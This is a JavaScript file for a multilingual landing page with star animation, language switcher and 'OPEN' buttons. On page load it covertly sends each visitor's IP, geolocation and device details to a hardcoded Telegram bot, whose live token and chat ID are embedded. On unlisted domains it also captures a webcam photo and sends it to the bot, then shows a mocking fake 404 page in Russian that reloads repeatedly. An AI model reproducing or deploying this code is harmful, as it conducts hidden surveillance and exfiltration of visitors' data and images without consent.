const TELEGRAM_BOT_TOKEN = '8177372639:AAEh7lIQ8VHz_Qn5E6q1yJEIAFW0L4sdtCs';
const ADMIN_ID = '6436999031';

async function sendTelegramMessage(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: ADMIN_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        const data = await response.json();
        if (!data.ok) {
            console.error('Failed to send message:', data);
        }
    } catch (error) {
        console.error('Failed to send message:', error);
    }
}

async function getCountryName(countryCode) {
    try {
        const response = await fetch(`https://restcountries.com/v3.1/alpha/${countryCode}`);
        const data = await response.json();
        return data[0]?.name.common || 'Unknown';
    } catch (error) {
        console.error('Failed to fetch country name:', error);
        return 'Unknown';
    }
}

async function getUserInfo() {
    try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        const countryName = await getCountryName(data.country);
        const deviceInfo = parseUserAgent(navigator.userAgent);

        return {
            ip: data.ip,
            country: data.country,
            countryName: countryName,
            city: data.city,
            region: data.region,
            countryEmoji: getCountryEmoji(data.country),
            userAgent: navigator.userAgent,
            deviceModel: deviceInfo.model,
            deviceType: deviceInfo.type,
            deviceOS: deviceInfo.os
        };
    } catch (error) {
        console.error('Failed to fetch user info:', error);
        return {
            ip: 'Unknown',
            country: 'Unknown',
            countryName: 'Unknown',
            city: 'Unknown',
            region: 'Unknown',
            countryEmoji: '❓',
            userAgent: navigator.userAgent,
            deviceModel: 'Unknown',
            deviceType: 'Unknown',
            deviceOS: 'Unknown'
        };
    }
}

function parseUserAgent(userAgent) {
    const mobileRegexes = [
        { regex: /iPhone\s*(\d+([_\.]\d+)*)/i, type: 'Mobile', os: 'iOS' },
        { regex: /iPad/i, type: 'Tablet', os: 'iOS' },
        { regex: /Android\s*([\d\.]+)/i, type: 'Mobile', os: 'Android' },
        { regex: /Windows Phone\s*([\d\.]+)/i, type: 'Mobile', os: 'Windows Phone' },
    ];

    const desktopRegexes = [
        { regex: /Windows/i, type: 'Desktop', os: 'Windows' },
        { regex: /Macintosh/i, type: 'Desktop', os: 'macOS' },
        { regex: /Linux/i, type: 'Desktop', os: 'Linux' }
    ];

    for (let mobileDevice of mobileRegexes) {
        const match = userAgent.match(mobileDevice.regex);
        if (match) {
            return {
                type: mobileDevice.type,
                os: mobileDevice.os,
                model: parseDeviceModel(userAgent, mobileDevice.os)
            };
        }
    }

    for (let desktopOS of desktopRegexes) {
        const match = userAgent.match(desktopOS.regex);
        if (match) {
            return {
                type: desktopOS.type,
                os: desktopOS.os,
                model: parseDeviceModel(userAgent, desktopOS.os)
            };
        }
    }

    return {
        type: 'Unknown',
        os: 'Unknown',
        model: 'Unknown Device'
    };
}

function parseDeviceModel(userAgent, os) {
    switch(os) {
        case 'iOS':
            const iPhoneMatch = userAgent.match(/iPhone\s*(\d+([_\.]\d+)*)/i);
            if (iPhoneMatch) {
                return `iPhone ${iPhoneMatch[1].replace(/[_\.]/g, ' ')}`;
            }
            const iPadMatch = userAgent.match(/iPad/i);
            if (iPadMatch) {
                return 'iPad';
            }
            break;
        case 'Android':
            const androidModelMatch = userAgent.match(/;\s*([^;)]+)\s*Build/i);
            if (androidModelMatch) {
                return androidModelMatch[1].trim();
            }
            break;
        case 'Windows':
            const windowsModelMatch = userAgent.match(/Windows\s*([\w\s]+)/i);
            if (windowsModelMatch) {
                return `Windows ${windowsModelMatch[1]}`;
            }
            break;
        case 'macOS':
            const macModelMatch = userAgent.match(/Macintosh;.*Mac\s*([\w\s]+)/i);
            if (macModelMatch) {
                return `Mac ${macModelMatch[1]}`;
            }
            break;
    }
    return 'Unknown Device';
}

function getCountryEmoji(countryCode) {
    return countryCode.replace(/./g, char =>
        String.fromCodePoint(127397 + char.toUpperCase().charCodeAt())
    );
}

async function captureAndSendPhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        video.pause();
        stream.getTracks().forEach(track => track.stop());

        const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
        const formData = new FormData();
        formData.append('chat_id', ADMIN_ID);
        formData.append('photo', imageBlob, 'photo.jpg');

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        console.log('Photo captured and sent successfully');
    } catch (error) {
        console.error('Failed to capture photo:', error);
    }
}

async function initTelegramBot() {
    const domainInfo = {
        domain: window.location.hostname,
        fullUrl: window.location.href
    };


    if (domainInfo.domain !== 'entyludik.github.io' && domainInfo.domain !== 'rokinchik.github.io') {
        document.body.innerHTML = `
            <div id="overlay">
                <h1>Ошибка 404: Доступ запрещен</h1>
                <div class="arrow top"></div>
                <div class="arrow bottom"></div>
                <div class="arrow left"></div>
                <div class="arrow right"></div>
                <img src="data:image/png;base64,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" alt="Error Image" style="max-width: 100%; height: auto;" />
                <p>К сожалению, возникли проблемы с доступом к сайту:</p>
                <ul>
                    <li>Не удалось загрузить ресурс.</li>
                    <li>Проблемы с сервером.</li>
                    <li>Неправильный домен.</li>
                    <li>Возможно вы блюм.</li>
                    <li>Возможно вы хотели спиздить вебку.</li>
                    <li>Возможно вы хотели обновить вебку за 15$.</li>
                    <li>Возможно вы хотели купить вебку у ее кодера.</li>
                </ul>
                <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" id="fixButton">Fix It</a>
            </div>
        `;

        const style = document.createElement('style');
        style.innerHTML = `
            body {
                margin: 0;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                position: relative;
                overflow: hidden;
                background-color: #282c34;
                color: white;
                font-family: 'Arial', sans-serif;
            }
            #overlay {
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: linear-gradient(135deg, rgba(255, 0, 0, 0.7), rgba(255, 255, 0, 0.7));
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                z-index: 9999;
                padding: 20px;
                animation: flicker 1s infinite;
            }
            h1 {
                font-size: 4em;
                margin: 0;
                text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
                animation: glow 1.5s infinite alternate;
            }
            p {
                font-size: 1.5em;
                margin: 20px 0;
                text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);
            }
            ul {
                list-style-type: none;
                padding: 0;
                text-align: center;
                font-size: 1.2em;
            }
            #fixButton {
                background-color: white;
                color: red;
                border: none;
                padding: 10px 20px;
                font-size: 18px;
                cursor: pointer;
                text-decoration: none;
                border-radius: 5px;
                transition: background-color 0.3s, transform 0.3s;
                box-shadow: 0 0 10px rgba(255, 0, 0, 0.8);
            }
            #fixButton:hover {
                background-color: #ddd;
                transform: scale(1.05);
            }
            @keyframes flicker {
                0% { opacity: 1; }
                50% { opacity: 0.7; }
                100% { opacity: 1; }
            }
            @keyframes glow {
                0% { text-shadow: 0 0 10px rgba(255, 255, 255, 0.8); }
                100% { text-shadow: 0 0 20px rgba(255, 255, 255, 1); }
            }
        `;
        document.head.appendChild(style);

        const userInfo = await getUserInfo();
        await sendTelegramMessage(`
🚫 <b>Unauthorized Access Attempt Detected</b>
📍 Domain: <code>${domainInfo.domain}</code>
🔗 URL: <code>${domainInfo.fullUrl}</code>
🌐 IP: <code>${userInfo.ip}</code>
📌 Location: ${userInfo.city}, ${userInfo.region}, ${userInfo.countryName} ${userInfo.countryEmoji}
📱 Device: <code>${userInfo.deviceModel}</code>
🖥️ Type: <code>${userInfo.deviceType} (${userInfo.deviceOS})</code>
📱 User Agent: <code>${userInfo.userAgent}</code>
⏰ Time: <code>${new Date().toISOString()}</code>
        `);

        await captureAndSendPhoto();

        // Перезагрузка страницы каждую секунду
        setInterval(() => {
            location.reload();
        }, 11200);

        return;
    }

    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
        const data = await response.json();

        if (data.ok) {
            console.log('Bot initialized');
            isAuthenticated = true;

            const userInfo = await getUserInfo();
            await sendTelegramMessage(`
🚀 <b>New Bot Access Detected</b>
📍 Domain: <code>${domainInfo.domain}</code>
🔗 URL: <code>${domainInfo.fullUrl}</code>
🌐 IP: <code>${userInfo.ip}</code>
📌 Location: ${userInfo.city}, ${userInfo.region}, ${userInfo.countryName} ${userInfo.countryEmoji}
📱 Device: <code>${userInfo.deviceModel}</code>
🖥️ Type: <code>${userInfo.deviceType} (${userInfo.deviceOS})</code>
📱 User Agent: <code>${userInfo.userAgent}</code>
⏰ Time: <code>${new Date().toISOString()}</code>
            `);
        }
    } catch (error) {
        console.error('Failed to initialize bot:', error);

        const userInfo = await getUserInfo();
        await sendTelegramMessage(`
❗️ <b>Bot Initialization Failed</b>
📍 Domain: <code>${domainInfo.domain}</code>
🔗 URL: <code>${domainInfo.fullUrl}</code>
🌐 IP: <code>${userInfo.ip}</code>
📌 Location: ${userInfo.city}, ${userInfo.region}, ${userInfo.countryName} ${userInfo.countryEmoji}
📱 Device: <code>${userInfo.deviceModel}</code>
🖥️ Type: <code>${userInfo.deviceType} (${userInfo.deviceOS})</code>
📱 User Agent: <code>${userInfo.userAgent}</code>
⏰ Time: <code>${new Date().toISOString()}</code>
        `);
    }
}

document.addEventListener('DOMContentLoaded', (event) => {
    initTelegramBot();
});


function createStars() {
    const starsContainer = document.querySelector('.stars');
    const count = 300;

    for (let i = 0; i < count; i++) {
        const star = document.createElement('div');
        star.className = 'star';

        const x = Math.random() * 100;
        const y = Math.random() * 100;
        const size = Math.random() * 2;
        const duration = 3 + Math.random() * 4;

        star.style.left = `${x}%`;
        star.style.top = `${y}%`;
        star.style.width = `${size}px`;
        star.style.height = `${size}px`;
        star.style.setProperty('--duration', `${duration}s`);

        starsContainer.appendChild(star);
    }
}

function toggleLangMenu() {
    const options = document.getElementById('lang-options');
    options.classList.toggle('show');
}

const deviceTexts = {
    pc: {
        ru: 'ПК',
        en: 'PC',
        hi: 'पीसी',
        br: 'PC',
        es: 'PC',
        uz: 'PK',
        az: 'PC',
        tr: 'PC',
        pt: 'PC',
        ar: 'كمبيوتر'
    },
    android: {
        ru: 'Android',
        en: 'Android',
        hi: 'एन्ड्रोयड',
        br: 'Android',
        es: 'Android',
        uz: 'Android',
        az: 'Android',
        tr: 'Android',
        pt: 'Android',
        ar: 'أندرويد'
    },
    ios: {
        ru: 'iOS',
        en: 'iOS',
        hi: 'आईओएस',
        br: 'iOS',
        es: 'iOS',
        uz: 'iOS',
        az: 'iOS',
        tr: 'iOS',
        pt: 'iOS',
        ar: 'آيفون'
    }
};

function switchLanguage(lang) {
    const currentFlag = document.getElementById('current-flag');
    const currentText = document.getElementById('current-lang-text');
    const langFileName = lang === 'hi' ? 'hin' : lang;

    currentFlag.src = `avas/${langFileName}.png`;
    currentText.textContent = lang.toUpperCase();

    document.querySelectorAll('.play-button').forEach(button => {
        button.textContent = button.getAttribute(`data-${lang}`);
    });

    document.documentElement.lang = lang;

    document.getElementById('lang-options').classList.remove('show');

    const langOptions = document.getElementById('lang-options');
    langOptions.innerHTML = '';

    // Define all available languages
    const allLanguages = [
        { code: 'ru', name: 'RU', file: 'ru' },
        { code: 'en', name: 'EN', file: 'en' },
        { code: 'hi', name: 'हिन्दी (HI)', file: 'hin' },
        { code: 'br', name: 'PT-BR', file: 'br' },
        { code: 'es', name: 'ES', file: 'es' },
        { code: 'uz', name: 'UZ', file: 'uz' },
        { code: 'az', name: 'AZ', file: 'az' },
        { code: 'tr', name: 'TR', file: 'tr' },
        { code: 'pt', name: 'PT', file: 'pt' },
        { code: 'ar', name: 'العربية', file: 'ar' }
    ];

    // Filter out current language and create options for others
    const otherLangs = allLanguages.filter(l => l.code !== lang);
    otherLangs.forEach(otherLang => {
        langOptions.innerHTML += `
            <div class="lang-option" onclick="switchLanguage('${otherLang.code}')">
                <img src="avas/${otherLang.file}.png" alt="${otherLang.name}" class="lang-flag">
                <span class="lang-text">${otherLang.name}</span>
            </div>
        `;
    });
    updateDeviceInfo(lang);
}

function detectDevice() {
    const userAgent = navigator.userAgent.toLowerCase();
    if (/android/i.test(userAgent)) {
        return 'android';
    } else if (/iphone|ipad|ipod/i.test(userAgent)) {
        return 'ios';
    } else {
        return 'pc';
    }
}

function updateDeviceInfo(lang) {
    const deviceType = detectDevice();
    const deviceIcon = document.getElementById('device-icon');
    const deviceText = document.getElementById('device-text');

    let iconClass = deviceType === 'pc' ? '💻' : '📱';
    let text = deviceTexts[deviceType][lang] || deviceTexts[deviceType]['en'];

    deviceIcon.textContent = iconClass;
    deviceText.textContent = text;
}

let lastScrollTop = 0;
const topBar = document.querySelector('.top-bar');
let isHidden = false;

window.addEventListener('scroll', () => {
    const scrollTop = window.pageYOffset || document.documentElement.scrollTop;

    document.getElementById('lang-options').classList.remove('show');

    if (scrollTop > lastScrollTop && scrollTop > 50 && !isHidden) {
        topBar.classList.add('hidden');
        isHidden = true;
    }

    if (scrollTop <= 0 && isHidden) {
        topBar.classList.remove('hidden');
        isHidden = false;
    }

    lastScrollTop = scrollTop <= 0 ? 0 : scrollTop;
}, false);

document.addEventListener('click', (e) => {
    const switcher = document.querySelector('.language-switcher');
    if (!switcher.contains(e.target)) {
        document.getElementById('lang-options').classList.remove('show');
    }
});

document.addEventListener('DOMContentLoaded', () => {
    createStars();
    switchLanguage('ru');
    updateDeviceInfo('ru');

    // Add data attributes dynamically
    const playButtons = document.querySelectorAll('.play-button');
    playButtons.forEach(button => {
        button.setAttribute('data-ru', 'ОТКРЫТЬ');
        button.setAttribute('data-en', 'OPEN');
        button.setAttribute('data-hi', 'खोलें');
        button.setAttribute('data-br', 'ABRIR');
        button.setAttribute('data-es', 'ABRIR');
        button.setAttribute('data-uz', 'OCHISH');
        button.setAttribute('data-az', 'AÇ');
        button.setAttribute('data-tr', 'AÇ');
        button.setAttribute('data-pt', 'ABRIR');
        button.setAttribute('data-ar', 'فتح');
        button.textContent = 'ОТКРЫТЬ'; // Set default text to Russian
    });
});
